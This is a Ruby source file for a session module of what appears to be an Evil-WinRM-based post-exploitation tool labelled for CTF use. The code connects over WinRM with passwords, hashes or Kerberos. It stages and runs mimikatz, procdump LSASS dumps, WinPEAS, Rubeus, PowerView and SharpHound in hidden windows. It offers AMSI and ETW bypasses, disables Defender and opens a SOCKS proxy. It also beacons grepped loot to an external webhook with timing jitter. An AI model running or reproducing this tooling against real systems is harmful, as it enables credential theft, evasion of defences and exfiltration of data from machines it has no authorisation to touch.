# lib/evil_ctf/session.rb
require_relative 'shell_wrapper'
require_relative 'banner'
require_relative 'tools'
require_relative 'uploader' # loads EvilCTF::Uploader
require_relative 'enums'
require_relative 'sql_enum'
require 'readline'
require 'timeout'
require 'evil_ctf/uploader'
require 'ipaddr'
require 'yaml'
require 'fileutils'

module EvilCTF::Session
  # Alias for the uploader helper
  Uploader = EvilCTF::Uploader

  # ------------------------------------------------------------------
  # Main session loop & command handling
  # ------------------------------------------------------------------
  def self.run_session(session_options)
    # Ensure reconnect_attempts is always an integer
    session_options[:reconnect_attempts] = session_options[:reconnect_attempts].to_i

    orig_ip = session_options[:ip]
    host = session_options[:ip].match?(/:/) ? 'ipv6addr' : normalize_host(orig_ip)
    add_ipv6_to_hosts(session_options[:ip].split('%')[0]) if session_options[:ip].match?(/:/)
    scheme = session_options[:ssl] ? 'https' : 'http'
    endpoint = "#{scheme}://#{host}:#{session_options[:port]}/wsman"
    session_options[:endpoint] = endpoint
    EvilCTF::ShellWrapper.socksify!(session_options[:proxy]) if session_options[:proxy]
    puts "[*] Testing connection to #{orig_ip} (using #{host} in endpoint...)"

    # Connection creation
    conn = if session_options[:kerberos]
      WinRM::Connection.new(
        endpoint: endpoint,
        user: session_options[:user],
        password: '',
        transport: :kerberos,
        realm: session_options[:realm],
        keytab: session_options[:keytab],
        no_ssl_peer_verification: true
      )
    elsif session_options[:hash]
      WinRM::Connection.new(
        endpoint: endpoint,
        user: session_options[:user],
        password: '',
        transport: :negotiate,
        no_ssl_peer_verification: true
      )
    else
      WinRM::Connection.new(
        endpoint: endpoint,
        user: session_options[:user],
        password: session_options[:password],
        no_ssl_peer_verification: true
      )
    end

    shell = nil
    begin
      shell = conn.shell(:powershell)
      logger = SessionLogger.new(session_options[:logfile])
      history = CommandHistory.new
      command_manager = EvilCTF::Tools::CommandManager.new

      shell.run(%q{
        function prompt { "PS $pwd> " }
        Set-Alias __exit__ Exit-PSSession
      })

      puts "[+] Connected to #{orig_ip}"

      banner_mode = session_options[:banner_mode] || :minimal
      if EvilCTF::Banner.respond_to?(:show_banner)
        EvilCTF::Banner.show_banner(shell, session_options, mode: banner_mode, no_color: false)
      else
        EvilCTF::Banner.show_banner_with_flagscan(shell, session_options)
      end

      setup_autocomplete(history)
      enum_cache = {}

      # Enumeration presets
      if session_options[:enum]
        puts "[*] Running enumeration preset: #{session_options[:enum]}"
        case session_options[:enum]
        when 'deep'
          EvilCTF::Tools.safe_autostage('winpeas', shell, session_options, logger)
        when 'dom'
          EvilCTF::Tools.safe_autostage('powerview', shell, session_options, logger)
          shell.run("IEX (Get-Content 'C:\\Users\\Public\\PowerView.ps1' -Raw)")
        when 'sql'
          EvilCTF::SQLEnum.run_sql_enum(shell)
        else
          EvilCTF::Enums.run_enumeration(shell, type: session_options[:enum], cache: enum_cache,
                                         fresh: session_options[:fresh])
        end
      end

      puts "Type 'help' for commands, '__exit__' or 'exit' to quit, or !bash for local shell.\n\n"

      should_exit = false

      loop do
        begin
          Timeout.timeout(1800) do
            prompt = shell.run('prompt').output
            input = Readline.readline(prompt, true)
            break if input.nil?
            input = input.strip
            next if input.empty?

            if input =~ /^(exit|quit|__exit__)$/i
              puts '[*] Exiting session...'
              break
            end

            history.add(input)

            case input
            when /^help$/i
              puts "\nBuiltin commands:"
              puts ' help - This help'
              puts ' clear - Clear screen'
              puts ' tools - List tool registry'
              puts ' download_missing - Download all missing tools into ./tools'
              puts ' dump_creds - Stage mimikatz & dump logon passwords'
              puts ' lsass_dump - Stage procdump & dump LSASS to ./loot'
              puts ' enum [type] - Run enumeration preset (basic, deep, sql, etc.)'
              puts ' fileops - File operations menu (upload/download/ZIP)'
              puts ' bypass-4msi - Try AMSI bypass'
              puts ' bypass-etw - Full ETW bypass'
              puts ' disable_defender - Try disabling Defender real-time'
              puts ' history - Show command history'
              puts ' history clear - Clear history file'
              puts ' profile save <name> - Save current options as profile'
              puts ' get-unquotedservices - Show all unquoted service paths'
              puts ' upload <local> <remote> - Upload file (original Evil-WinRM style)'
              puts ' download <remote> <local> - Download file (original Evil-WinRM style)'
              puts ' load_ps1 <local_ps1> - Upload and load PS1 script'
              puts ' invoke-binary <local_bin> [args] - Upload and execute binary'
              puts ' services - List services'
              puts ' processes - List processes'
              puts ' sysinfo - System info'
              puts " __exit__/exit/quit - Exit this Evil-WinRM CTF session"
              puts ' !sh / !bash - Spawn local shell'
              puts "\nMacros: #{command_manager.list_macros.join(', ')}"
              puts "Aliases: #{command_manager.list_aliases.join(', ')}"
              next
            when /^clear$/i
              system('clear || cls')
              next
            when /^tools$/i
              EvilCTF::Tools.list_available_tools
              next
            when /^download_missing$/i
              EvilCTF::Tools.download_missing_tools
              next
            when /^dump_creds$/i
              EvilCTF::Tools.safe_autostage('mimikatz', shell, session_options, logger)
              EvilCTF::Tools.safe_autostage('powerview', shell, session_options, logger)
              command_manager.expand_macro('dump_creds', shell,
                                           webhook: session_options[:webhook])
              next
            when /^lsass_dump$/i
              EvilCTF::Tools.safe_autostage('procdump', shell, session_options, logger)
              command_manager.expand_macro('lsass_dump', shell,
                                           webhook: session_options[:webhook])
              Uploader.download_file('C:\\Users\\Public\\lsass.dmp',
                                     "loot/lsass_#{session_options[:ip]}.dmp",
                                     shell)
              next
            when /^fileops$/i
              Uploader.file_operations_menu(shell)
              next
            when /^enum(?:\s+(\S+))?$/i
              t = Regexp.last_match(1) || 'basic'
              if t == 'deep'
                EvilCTF::Tools.safe_autostage('winpeas', shell, session_options, logger)
              end
              if t == 'dom'
                EvilCTF::Tools.safe_autostage('powerview', shell, session_options, logger)
                shell.run("IEX (Get-Content 'C:\\Users\\Public\\PowerView.ps1' -Raw)")
              end
              if t == 'sql'
                EvilCTF::SQLEnum.run_sql_enum(shell)
              else
                EvilCTF::Enums.run_enumeration(shell, type: t, cache: enum_cache,
                                               fresh: session_options[:fresh])
              end
              next
            when /^dom_enum$/i
              EvilCTF::Tools.safe_autostage('powerview', shell, session_options, logger)
              shell.run("IEX (Get-Content 'C:\\Users\\Public\\PowerView.ps1' -Raw)")
              EvilCTF::Enums.run_enumeration(shell, type: 'dom', cache: enum_cache,
                                             fresh: session_options[:fresh])
              next
            when /^disable_defender$/i
              EvilCTF::Tools.disable_defender(shell)
              next
            when /^history$/i
              history.show
              next
            when /^history\s+clear$/i
              history.clear
              puts '[+] History cleared'
              next
            when /^profile\s+save\s+(\S+)$/i
              name = Regexp.last_match(1)
              EvilCTF::Tools.save_config_profile(name, session_options)
              next
            when /^get-unquotedservices$/i
              puts "[*] Getting all unquoted service paths..."
              unquoted_ps = <<~POWERSHELL
                Get-CimInstance -Class Win32_Service | Where-Object {
                  $_.PathName -notlike '`"*' -and $_.PathName -like '*.exe*' -and $_.PathName -like '* *'
                } | Select-Object Name, DisplayName, PathName, State, StartMode | Format-Table -AutoSize
              POWERSHELL
              result = shell.run(unquoted_ps)
              puts result.output
              next
            when /^tool\s+(\w+)$/i
              key = Regexp.last_match(1)
              if key == 'all'
                puts "[*] Staging all tools..."
                EvilCTF::Tools::TOOL_REGISTRY.each_key do |tool_key|
                  EvilCTF::Tools.safe_autostage(tool_key, shell, session_options, logger)
                end
              else
                puts "[*] Staging tool: #{key}"
                success = EvilCTF::Tools.safe_autostage(key, shell, session_options, logger)
                if success
                  puts "[+] Tool '#{key}' staged successfully"
                  tool = EvilCTF::Tools::TOOL_REGISTRY[key]
                  if tool && tool[:recommended_remote]
                    remote_path = tool[:recommended_remote]
                    case key
                    when 'mimikatz'
                      puts "[*] Executing mimikatz..."
                      ps_cmd = <<~PS
                        try {
                          $proc = Start-Process -FilePath "#{remote_path}" -PassThru -WindowStyle Hidden
                          $proc.WaitForExit(30000) | Out-Null
                          if ($proc.HasExited) {
                            Write-Output "Mimikatz completed with exit code: $($proc.ExitCode)"
                          } else {
                            Write-Output "Mimikatz timed out after 30 seconds"
                            $proc.Kill()
                          }
                        } catch {
                          Write-Output "Error executing mimikatz: $_.Exception.Message"
                        }
                      PS
                      result = shell.run(ps_cmd)
                      puts result.output
                    when 'winpeas'
                      puts "[*] Executing winpeas..."
                      ps_cmd = <<~PS
                        try {
                          $proc = Start-Process -FilePath "cmd" -ArgumentList "/c #{remote_path}" -PassThru -WindowStyle Hidden
                          $proc.WaitForExit(60000) | Out-Null
                          if ($proc.HasExited) {
                            Write-Output "WinPEAS completed with exit code: $($proc.ExitCode)"
                          } else {
                            Write-Output "WinPEAS timed out after 60 seconds"
                            $proc.Kill()
                          }
                        } catch {
                          Write-Output "Error executing winpeas: $_.Exception.Message"
                        }
                      PS
                      result = shell.run(ps_cmd)
                      puts result.output
                    when 'procdump'
                      puts "[*] Executing procdump..."
                      ps_cmd = <<~PS
                        try {
                          $proc = Start-Process -FilePath "cmd" -ArgumentList "/c #{remote_path}" -PassThru -WindowStyle Hidden
                          $proc.WaitForExit(30000) | Out-Null
                          if ($proc.HasExited) {
                            Write-Output "Procdump completed with exit code: $($proc.ExitCode)"
                          } else {
                            Write-Output "Procdump timed out after 30 seconds"
                            $proc.Kill()
                          }
                        } catch {
                          Write-Output "Error executing procdump: $_.Exception.Message"
                        }
                      PS
                      result = shell.run(ps_cmd)
                      puts result.output
                    when 'rubeus', 'seatbelt'
                      puts "[*] Executing #{key}..."
                      ps_cmd = <<~PS
                        try {
                          $proc = Start-Process -FilePath "#{remote_path}" -PassThru -WindowStyle Hidden
                          $proc.WaitForExit(30000) | Out-Null
                          if ($proc.HasExited) {
                            Write-Output "#{key.capitalize} completed with exit code: $($proc.ExitCode)"
                          } else {
                            Write-Output "#{key.capitalize} timed out after 30 seconds"
                            $proc.Kill()
                          }
                        } catch {
                          Write-Output "Error executing #{key}: $_.Exception.Message"
                        }
                      PS
                      result = shell.run(ps_cmd)
                      puts result.output
                    when 'inveigh', 'powerview', 'sharphound'
                      puts "[*] Executing #{key} PowerShell script..."
                      ps_script = "IEX (Get-Content '#{remote_path}' -Raw) 2>&1"
                      result = shell.run(ps_script)
                      puts result.output
                    when 'socksproxy'
                      puts "[*] Executing SOCKS proxy PowerShell module..."
                      ps_script = "Import-Module '#{remote_path}' 2>&1; Invoke-SocksProxy -Port 1080"
                      result = shell.run(ps_script)
                      puts result.output
                    else
                      if remote_path.end_with?('.exe')
                        puts "[*] Executing #{key}..."
                        ps_cmd = <<~PS
                          try {
                            $proc = Start-Process -FilePath "#{remote_path}" -PassThru -WindowStyle Hidden
                            $proc.WaitForExit(30000) | Out-Null
                            if ($proc.HasExited) {
                              Write-Output "#{key.capitalize} completed with exit code: $($proc.ExitCode)"
                            } else {
                              Write-Output "#{key.capitalize} timed out after 30 seconds"
                              $proc.Kill()
                            }
                          } catch {
                            Write-Output "Error executing #{key}: $_.Exception.Message"
                          }
                        PS
                        result = shell.run(ps_cmd)
                        puts result.output
                      else
                        puts "[*] Tool staged. Execute manually with: #{remote_path}"
                      end
                    end
                  end
                else
                  puts "[-] Failed to stage tool '#{key}'"
                end
              end
            when /^!bash$/i, /^!sh$/i
              puts '[*] Spawning local shell. Type "exit" to return.'
              system(ENV['SHELL'] || '/bin/bash')
              next
            end

            # Macro expansion
            if command_manager.expand_macro(input, shell,
                                            webhook: session_options[:webhook])
              next
            end

            # Normal command path
            cmd = command_manager.expand_alias(input)
            start = Time.now
            result = shell.run(cmd)
            elapsed = Time.now - start
            puts result.output
            matches = EvilCTF::Tools.grep_output(result.output)
            if matches.any?
              EvilCTF::Tools.save_loot(matches)
              EvilCTF::Tools.beacon_loot(session_options[:webhook], matches) if session_options[:webhook]
            end

            logger.log_command(cmd, result, elapsed,
                               '$PID', result.exitcode || 0)
            sleep(rand(30..90)) if session_options[:beacon]
          end
        rescue Timeout::Error
          puts "\n[!] Idle timeout — closing session"
          break
        rescue Interrupt
          puts "\n[!] Ctrl-C detected; exiting."
          break
        rescue => e
          # Handle connection errors gracefully
          if e.is_a?(WinRM::WinRMAuthorizationError) || e.is_a?(Net::HTTPServerException)
            puts "[!] WARNING - Connection lost: #{e.message}"
            puts "  This may indicate: session timeout, network issues, or firewall changes"
            break
          elsif e.is_a?(WinRM::WinRMEndpointError)
            puts "[!] WARNING - Connection failed: #{e.message}"
            puts "  This may indicate WinRM service not running or firewall blocking access"
          elsif e.is_a?(WinRM::WinRMAuthenticationError)
            puts "[!] WARNING - Authentication failed: #{e.message}"
            puts "  Check credentials or Kerberos configuration"
          elsif e.is_a?(WinRM::WinRMTransportError)
            puts "[!] WARNING - Transport error: #{e.message}"
            puts "  Possible SSL/TLS or proxy issues"
          else
            puts "[!] WARNING - Session error: #{e.message}"
          end

          # Safe reconnect logic
          if session_options[:reconnect_attempts].to_i > 0 && !should_exit
            puts "[*] Attempting to reconnect (#{session_options[:reconnect_attempts]} attempts remaining)..."
            sleep(5)
            session_options[:reconnect_attempts] -= 1
            retry
          else
            break
          end
        end
      end

      shell.close if shell
    rescue => e
      # Enhanced error handling for connection creation failures
      puts "[!] WARNING - Failed to create PowerShell session: #{e.message}"
      puts "  This may indicate: network issues, firewall blocking, WinRM misconfig, or auth problems"

      # Attempt to reconnect if possible
      if session_options[:reconnect_attempts].to_i > 0
        puts "[*] Attempting to reconnect (#{session_options[:reconnect_attempts]} attempts remaining)..."
        sleep(5)
        session_options[:reconnect_attempts] -= 1
        retry
      else
        puts "[!] Maximum reconnection attempts reached. Exiting."
        return false
      end
    end

    shell.close if shell
    puts '[+] Session closed.'
    true
  end

  # ------------------------------------------------------------------
  # Helper utilities
  # ------------------------------------------------------------------
  def self.normalize_host(host)
    begin
      ip_addr = IPAddr.new(host.split('%').first)
      ip_addr.ipv6? ? "[#{host.split('%')[0]}]" : host
    rescue IPAddr::InvalidAddressError
      host
    end
  end

  def self.add_ipv6_to_hosts(ip)
    # Stubbed for safety — implement if you need to manipulate /etc/hosts
    # e.g., ensure bracketed IPv6 formatting or friendly name mapping
    # No-op by default to avoid side effects in Kali VMs
    # puts "[*] IPv6 detected: #{ip} (no hosts modifications performed)"
  end

  def self.setup_autocomplete(history)
    Readline.completion_append_character = " "
    Readline.completion_proc = proc { |s| history.history.grep(/^#{Regexp.escape(s)}/) }
  end

  def self.parse_hosts_file(hosts_file)
    hosts = []
    return hosts unless File.exist?(hosts_file)
    File.readlines(hosts_file).each do |line|
      line.strip!
      next if line.empty? || line.start_with?('#')
      parts = line.split(':')
      if parts.size >= 3
        hosts << { ip: parts[0], user: parts[1], password: parts[2] || '', hash: parts[3] }
      else
        puts "[!] Invalid host line: #{line}"
      end
    end
    hosts
  end

  def self.load_config_profile(profile_name)
    profile_path = "profiles/#{profile_name}.yaml"
    unless File.exist?(profile_path)
      puts "[-] Profile not found: #{profile_path}"
      return {}
    end
    YAML.load_file(profile_path)
  rescue => e
    puts "[-] Failed to load profile: #{e.message}"
    {}
  end

  # ------------------------------------------------------------------
  # Logging helper
  # ------------------------------------------------------------------
  class SessionLogger
    def initialize(logfile = nil)
      @logfile = logfile
      @start = Time.now
      setup if @logfile
    end

    def setup
      FileUtils.mkdir_p(File.dirname(@logfile)) if @logfile && File.dirname(@logfile) != '.'
      File.open(@logfile, 'a') do |f|
        f.puts "=== Session started: #{@start} ==="
        f.puts
      end
    end

    def log_command(cmd, result, elapsed = nil, pid = nil, exit_code = nil)
      return unless @logfile
      File.open(@logfile, 'a') do |f|
        f.puts "[#{Time.now}] >> #{cmd}"
        f.puts result.output
        f.puts "[#{Time.now}] << Completed in #{elapsed&.round(2)}s | PID: #{pid} | Exit: #{exit_code}"
        f.puts
      end
    end
  end

  # ------------------------------------------------------------------
  # Command history helper
  # ------------------------------------------------------------------
  class CommandHistory
    def initialize
      @history = []
    end

    def add(cmd)
      @history << cmd
    end

    def show
      @history.each_with_index { |c, i| puts "#{i+1}: #{c}" }
    end

    def clear
      @history = []
    end

    def history
      @history
    end
  end
end
